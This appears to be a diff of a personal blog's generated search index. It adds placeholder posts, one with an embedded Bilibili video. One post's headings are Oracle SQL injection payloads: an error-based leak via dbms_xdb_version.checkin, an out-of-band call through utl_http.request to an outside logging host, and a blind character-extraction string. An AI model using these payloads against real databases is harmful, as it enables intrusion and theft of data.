@@ -4,13 +4,100 @@
   
     
     <entry>
-      <title>Xxx</title>
-      <link href="/2023/10/14/Xxx/"/>
-      <url>/2023/10/14/Xxx/</url>
+      <title>xxx</title>
+      <link href="/2023/10/16/%E7%AC%AC%E5%9B%9B%E7%AF%87%E6%96%87%E7%AB%A0/"/>
+      <url>/2023/10/16/%E7%AC%AC%E5%9B%9B%E7%AF%87%E6%96%87%E7%AB%A0/</url>
       
-        <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
+        <content type="html"><![CDATA[<h2 id="文章文字输入点"><a href="#文章文字输入点" class="headerlink" title="文章文字输入点"></a>文章文字输入点</h2><div align=center class="aspect-ratio">    <iframe src="https://player.bilibili.com/player.html?aid=474023258&&page=1&as_wide=1&high_quality=1&danmaku=0"     scrolling="no"     border="0"     frameborder="no"     framespacing="0"     high_quality=1    danmaku=1     allowfullscreen="true">     </iframe></div>]]></content>
       
       
+      <categories>
+          
+          <category> veu </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 随笔 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>xxx</title>
+      <link href="/2023/10/16/%E7%AC%AC%E4%B8%89%E7%AF%87%E6%96%87%E7%AB%A0/"/>
+      <url>/2023/10/16/%E7%AC%AC%E4%B8%89%E7%AF%87%E6%96%87%E7%AB%A0/</url>
+      
+        <content type="html"><![CDATA[<h2 id="文章文字输入点"><a href="#文章文字输入点" class="headerlink" title="文章文字输入点"></a>文章文字输入点</h2>]]></content>
+      
+      
+      <categories>
+          
+          <category> 随笔 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 随笔 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>xxx</title>
+      <link href="/2023/10/16/%E7%AC%AC%E4%BA%8C%E7%AF%87%E6%96%87%E7%AB%A0/"/>
+      <url>/2023/10/16/%E7%AC%AC%E4%BA%8C%E7%AF%87%E6%96%87%E7%AB%A0/</url>
+      
+        <content type="html"><![CDATA[<h2 id="文章文字输入点"><a href="#文章文字输入点" class="headerlink" title="文章文字输入点"></a>文章文字输入点</h2><h2 id="select-from-t-user-where-’admin’-dbms-xdb-version-checkin-‘-’-user-’-’-’’-–-a"><a href="#select-from-t-user-where-’admin’-dbms-xdb-version-checkin-‘-’-user-’-’-’’-–-a" class="headerlink" title="select * from t_user where&#x3D;’admin’ || dbms_xdb_version.checkin(‘~~~’||user||’~~~’)||’’ – -a"></a>select * from t_user where&#x3D;’admin’ || dbms_xdb_version.checkin(‘~~~’||user||’~~~’)||’’ – -a</h2><h2 id="‘-utl-http-request-‘http-d08ea2b713-ipv6-1433-eu-org-‘’-–-a"><a href="#‘-utl-http-request-‘http-d08ea2b713-ipv6-1433-eu-org-‘’-–-a" class="headerlink" title="‘|| utl_http.request(‘http://d08ea2b713.ipv6.1433.eu.org.&#39;)||‘’ – -a"></a>‘|| utl_http.request(‘<a href="http://d08ea2b713.ipv6.1433.eu.org.')||/">http://d08ea2b713.ipv6.1433.eu.org.&#39;)||</a>‘’ – -a</h2><h2 id="select-from-t-user-where-name-’zdp5008’-regexp-replace-substr-user-1-1-’G’-’’-’’-–-a"><a href="#select-from-t-user-where-name-’zdp5008’-regexp-replace-substr-user-1-1-’G’-’’-’’-–-a" class="headerlink" title="select * from t_user where name&#x3D;’zdp5008’|| regexp_replace(substr(user,1,1),’G’,’’)||’’ – -a"></a>select * from t_user where name&#x3D;’zdp5008’|| regexp_replace(substr(user,1,1),’G’,’’)||’’ – -a</h2>]]></content>
+      
+      
+      <categories>
+          
+          <category> ps </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 批图 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>xxx</title>
+      <link href="/2023/10/14/index/"/>
+      <url>/2023/10/14/index/</url>
+      
+        <content type="html"><![CDATA[<h2 id="文章文字输入点"><a href="#文章文字输入点" class="headerlink" title="文章文字输入点"></a>文章文字输入点</h2>]]></content>
+      
+      
+      <categories>
+          
+          <category> 教程 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 教程 </tag>
+            
+        </tags>
       
     </entry>
     
